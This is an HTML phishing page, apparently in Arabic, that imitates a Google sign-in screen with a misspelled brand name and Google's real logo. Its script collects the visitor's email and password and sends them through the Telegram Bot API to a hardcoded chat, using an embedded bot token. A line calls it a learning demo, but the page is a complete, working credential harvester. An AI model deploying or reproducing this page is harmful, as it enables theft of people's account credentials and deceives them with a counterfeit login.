<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تسجيل الدخول - جوحل</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f1f3f4;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 380px;
      text-align: center;
    }
    .login-box img {
      width: 120px;
      margin-bottom: 20px;
    }
    .login-box h2 {
      margin-bottom: 20px;
      font-size: 22px;
      color: #333;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 12px;
      background: #1a73e8;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 18px;
      cursor: pointer;
      margin-top: 10px;
    }
    button:hover {
      background: #1669c1;
    }
    .warning {
      margin-top: 20px;
      color: red;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="logo">
    <h2>تسجيل الدخول - جوحل</h2>
    <input id="email" type="email" placeholder="البريد الإلكتروني">
    <input id="password" type="password" placeholder="كلمة المرور">
    <button onclick="sendData()">تسجيل الدخول</button>
    <p class="warning">⚠️ هذه صفحة تجريبية للتعلم فقط!</p>
  </div>

  <script>
    const telegramId = "8146130042"; // ID تبعك
    const botToken = "8366937425:AAEarLAfibjseYnH4O_gttjd8ePYsiBwVkM";

    function sendData(){
      let email = document.getElementById("email").value;
      let pass = document.getElementById("password").value;

      let message = `📩 تجربة تسجيل دخول\n\n📧 الإيميل: ${email}\n🔑 كلمة السر: ${pass}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${telegramId}&text=${encodeURIComponent(message)}`)
        .then(res => alert(" ⏳ يرجى الانتضار "))
        .catch(err => alert("❌ فشل الإرسال"));
    }
  </script>
</body>
</html>
